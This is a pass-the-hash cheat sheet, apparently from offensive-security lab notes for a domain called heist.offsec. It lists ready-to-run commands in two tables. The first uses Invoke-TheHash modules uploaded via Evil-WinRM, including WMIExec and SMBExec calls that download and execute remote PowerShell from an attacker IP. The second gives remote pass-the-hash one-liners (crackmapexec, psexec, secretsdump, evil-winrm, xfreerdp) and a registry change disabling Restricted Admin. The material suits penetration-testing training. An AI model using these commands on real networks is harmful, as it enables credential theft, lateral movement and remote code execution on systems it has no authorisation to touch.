# Pass the Hash

## Locally

| Info                                 | Command                                                                                                                                                                                                                        |
| ------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| WMIExec 1 - Upload from Evil-WinRM   | `upload /home/kali/share/windows/privesc/Invoke-TheHash/Invoke-WMIExec.ps1`                                                                                                                                                    |
| WMIExec 2 - Import Module            | `. ./Invoke-WMIExec.ps1`                                                                                                                                                                                                       |
| WMIExec 3 - Run Command              | `Invoke-WMIExec -Target dc01 -Domain heist.offsec -Username svc_apache$ -Hash 78bc82c952449150a12ad60e870a2be4 -Command 'powershell -ep bypass -Command "iex(iwr http://192.168.49.111:80 -UseBasicParsing)"' -verbose`        |
| SMBExec 1 - Upload from Evil-WinRM   | `upload /home/kali/share/windows/privesc/Invoke-TheHash/Invoke-SMBExec.ps1`                                                                                                                                                    |
| SMBExec 2 - Import Module            | `. ./Invoke-SMBExec.ps1`                                                                                                                                                                                                       |
| SMBExec 3 - Run Command              | `Invoke-SMBExec -Target dc01 -Domain heist.offsec -Username svc_apache$ -hash 78bc82c952449150a12ad60e870a2be4 -Command 'powershell -ep bypass -Command "iex(iwr http://192.168.49.111:80/pc.ps1 -UseBasicParsing)"' -verbose` |
| SMBEnum 1 - Upload from Evil-WinRM   | `upload /home/kali/share/windows/privesc/Invoke-TheHash/Invoke-SMBEnum.ps1`                                                                                                                                                    |
| SMBEnum 2 - Import Module            | `. ./Invoke-SMBEnum.ps1`                                                                                                                                                                                                       |
| SMBEnum 3 - Run Command              | `Invoke-SMBEnum -Domain heist.offsec -Username svc_apache$ -Hash 78bc82c952449150a12ad60e870a2be4 -Target dc01 -verbose`                                                                                                       |
| SMBClient 1 - Upload from Evil-WinRM | `upload /home/kali/share/windows/privesc/Invoke-TheHash/Invoke-SMBClient.ps1`                                                                                                                                                  |
| SMBClient 2 - Import Module          | `. ./Invoke-SMBClient.ps1`                                                                                                                                                                                                     |
| SMBClient 3 - Run Command            | `Invoke-SMBClient -Domain heist.offsec -Username svc_apache$ -Hash 78bc82c952449150a12ad60e870a2be4 -Action Recurse -Source \\dc01.heist.offsec\C$\ -verbose`                                                                  |
| TheHash 1 - Upload from Evil-WinRM   | `upload /home/kali/share/windows/privesc/Invoke-TheHash/Invoke-TheHash.ps1`                                                                                                                                                    |
| TheHash 2 - Import Module            | `. ./Invoke-TheHash.ps1`                                                                                                                                                                                                       |
| TheHash 3 - Run Command              | `Invoke-TheHash -Type WMIExec -Target dc01 -Username svc_apache$ -Hash 78bc82c952449150a12ad60e870a2be4`                                                                                                                       |

## Remotely

| Info                                                           | Command                                                                                                                                                                           |
| -------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| crackmapexec                                                   | `crackmapexec smb $ip -u $user -H $hash`                                                                                                                                          |
| psexec                                                         | `psexec.py $user@$ip -hashes :$hash`                                                                                                                                              |
| secretsdump                                                    | `secretsdump.py $user@$ip -hashes $hash`                                                                                                                                          |
| smbclient                                                      | `smbclient //$ip/$share -U $user --pw-nt-hash $hash`                                                                                                                              |
| WinRM                                                          | `evil-winrm -i $ip -u $user -H $hash`                                                                                                                                             |
| wmiexec.py                                                     | `wmiexec.py $user@$ip -hashes :$hash`                                                                                                                                             |
| xfreerdp 1 - Disable Restricted admin if required (Need admin) | `cme smb 10.0.0.200 -u Administrator -H 8846F7EAEE8FB117AD06BDD830B7586C -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'` |
| xfreerdp 2                                                     | `xfreerdp /v:$ip /u:$user /pth:$hash`                                                                                                                                             |
